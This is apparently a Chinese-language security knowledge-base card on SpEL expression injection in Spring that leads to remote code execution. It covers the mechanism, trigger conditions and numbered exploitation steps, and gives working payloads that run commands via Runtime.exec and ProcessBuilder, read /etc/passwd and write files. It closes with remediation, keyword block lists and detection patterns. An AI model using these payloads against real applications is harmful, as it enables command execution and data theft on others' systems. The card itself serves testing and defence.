---
id: web-java-expression-spel-injection-to-rce
title: 用户输入进入 SpelExpressionParser 导致 SpEL 注入命令执行
type: scenario
domain: web
path: web/java/expression/spel
technique: spel-injection-to-rce
aliases:
- SpEL 表达式注入
- Spring Expression Language 注入
- StandardEvaluationContext RCE
- SpelExpressionParser 命令执行
- T(java.lang.Runtime) 注入
tags:
- spel
- expression-injection
- spring
- rce
- java
- ssti
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V9
  verified_at: '2026-11-05T01:09:39+08:00'
  notes: '原文无图片，已通读全文并核对 SpEL 原理：T() 类型引用经 StandardTypeLocator/Class.forName 加载，StandardEvaluationContext 默认允许方法/构造器调用，SimpleEvaluationContext 可限制；命令执行、文件读取、模板 #{...} 入口 payload 均与原文一致。原文未涉及版本区间。未执行 PoC。'
---

## 一句话结论

当应用把用户可控字符串直接交给 `SpelExpressionParser#parseExpression()` 并在 `StandardEvaluationContext`（或默认上下文）下 `getValue()` 时，攻击者可用 `T()` 引用任意 Java 类并调用其静态/实例方法，从表达式探测一路走到命令执行与文件读写。

## 原理

- SpEL 的 `T(com.example.Type)` 是类型引用语法。解析器生成 `TypeReference` AST 节点，求值时通过 `EvaluationContext` 的 `TypeLocator`（默认 `StandardTypeLocator`）用 `Class.forName` 加载该类，因此可以访问 classpath 上的任意类，而不只是应用显式放入上下文的变量。
- `StandardEvaluationContext` 默认注册 `ReflectiveMethodResolver`、`ReflectivePropertyAccessor` 和构造器解析器，允许调用任意可见方法、访问属性、用 `new` 创建对象。`T(java.lang.Runtime).getRuntime()` 先反射调用静态 `getRuntime()` 取得单例，再调用 `exec(String)`，最终落到 `ProcessBuilder.start()`。
- 危险代码模式是把请求参数直接传入解析器：
  ```java
  ExpressionParser parser = new SpelExpressionParser();
  Expression exp = parser.parseExpression(request.getParameter("input"));
  exp.getValue();                       // 默认/StandardEvaluationContext
  ```
  使用 `TemplateParserContext` 时，只有 `#{...}` 包裹的片段会被求值，但同样可执行 `T(...)`。
- `SimpleEvaluationContext` 设计上不支持类型引用、构造器和任意方法调用，通常只能做只读数据绑定，是主要的安全替代方案。

## 触发条件

- Spring Framework 3.0+（引入 SpEL），应用存在把不可信输入传入 `parseExpression` 的代码路径。
- 求值上下文为默认上下文或 `StandardEvaluationContext`，未移除类型引用、方法调用、构造器解析器。
- 输入未做白名单或语法级过滤；WAF 未拦截 `T(`、`Runtime`、`ProcessBuilder` 等特征。
- 常见入口：参数直接作为表达式、模板字符串 `#{...}`、动态拼接的表达式、把用户输入作为 SpEL 变量值再参与表达式求值、Spring Data/Integration/Security 表达式配置被外部影响。

## 利用步骤

1. 确认表达式执行：提交 `1+1` 看是否返回 `2`；提交 `'hello'+'world'` 看是否返回 `helloworld`。
2. 确认类型引用未被禁用：提交 `T(java.lang.Math).PI`，返回 `3.141592653589793` 说明 `T()` 可用。
3. 收集环境信息：`T(java.lang.System).getProperty('os.name')`、`T(java.lang.System).getProperty('user.name')`、`T(java.lang.System).getenv()`。
4. 命令执行：`T(java.lang.Runtime).getRuntime().exec('id')`；需要参数数组时用 `new java.lang.String[]{'cmd','/c','whoami'}`。
5. 无回显时按回显卡处理；有返回值时用 `Scanner` 读取进程输出。
6. 需要读写文件时用 `T(java.nio.file.Files)` 与 `T(java.nio.file.Paths)`。

## PoC

最小命令执行：

```text
T(java.lang.Runtime).getRuntime().exec('id')
```

跨平台：

```text
T(java.lang.Runtime).getRuntime().exec('cmd /c whoami')
T(java.lang.Runtime).getRuntime().exec('/bin/sh -c id')
```

ProcessBuilder 形式（避免 `Runtime` 关键字时可用）：

```text
new java.lang.ProcessBuilder('id').start()
new java.lang.ProcessBuilder('cmd','/c','whoami').start()
```

带返回值读取文件：

```text
new java.lang.String(T(java.nio.file.Files).readAllBytes(T(java.nio.file.Paths).get('/etc/passwd')))
```

写文件：

```text
T(java.nio.file.Files).write(T(java.nio.file.Paths).get('/tmp/x.txt'),'hello'.getBytes())
```

模板上下文入口（`#{...}`）：

```text
hello #{T(java.lang.Runtime).getRuntime().exec('id')}
```

## 变体与关联

- 变体：`new java.lang.ProcessBuilder(...).redirectErrorStream(true).start()` 合并错误输出。
- 变体：`T(java.lang.System).getenv()`、`T(java.lang.System).getProperties()` 做信息收集；`new java.io.File('/').listFiles()` 枚举目录。
- 变体：Spring Bean 引用 `@beanName` 可直接调用容器内 Bean 的方法，取决于上下文是否注册 BeanResolver。
- 变体：Thymeleaf 视图名/片段、Spring Data 查询、Spring Integration 路由条件、Spring Security 方法表达式都可能成为入口，需结合具体框架卡判断。
- 关联：[[web-java-expression-spel-waf-bypass-scriptengine-reflection]]（关键字过滤时如何继续利用）。
- 关联：[[web-java-expression-spel-no-echo-exfil-streamutils]]（无回显时的回显与外带）。
- 关联：[[web-java-expression-spel-bytecode-defineclass-memshell]]（进一步加载字节码/内存马）。

## 检测与防御

- 修复：不要把用户输入传给 `parseExpression`；表达式应来自固定模板或白名单。
- 修复：改用 `SimpleEvaluationContext.forReadOnlyDataBinding().build()`，并关闭类型引用、构造器、Bean 引用和方法调用；确实需要方法调用时用自定义 `MethodResolver` 白名单。
- 加固：对表达式输入做语法白名单，拒绝 `T(`、`new `、`@`、`#`、`getClass`、`forName`、`invoke`、`Runtime`、`ProcessBuilder` 等特征；但黑名单不能作为唯一防线。
- 检测：请求参数/模板中出现 `T(java.lang.`、`T(org.springframework`、`Runtime`、`ProcessBuilder`、`ScriptEngineManager`、`getRuntime`、`exec(`、`getClass`、`forName` 等组合；响应中出现 `3.141592653589793` 等探测结果；应用日志出现 `SpelEvaluationException`、`SpelParseException` 且请求含表达式语法。
- 加固：JVM 层限制 `Runtime.exec`/`ProcessBuilder` 的使用面，开启 SecurityManager（评估兼容性）或使用容器级 seccomp/AppArmor 限制子进程；对 Web 进程做最小权限运行。
